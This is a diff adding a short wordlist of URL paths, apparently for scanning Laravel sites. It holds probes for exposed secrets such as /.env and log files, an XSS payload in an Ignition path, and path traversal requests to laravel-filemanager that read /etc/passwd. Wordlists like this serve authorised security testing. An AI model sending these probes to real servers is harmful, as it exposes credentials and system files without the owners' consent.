@@ -1,0 +1,16 @@
+/.env
+{{paths}}
+/storage/logs/laravel.log
+/_ignition/scripts/--><svg%20onload=alert(document.domain)>
+/laravel-filemanager?type=Files
+
+/composer.json
+/composer.lock
+/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
+/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
+/telescope/requests
+/_ignition/health-check
+///////this-should-not-exist,.<>!@#$%^&*()_+
+/%00
+/api/stats
+/horizon/api/stats
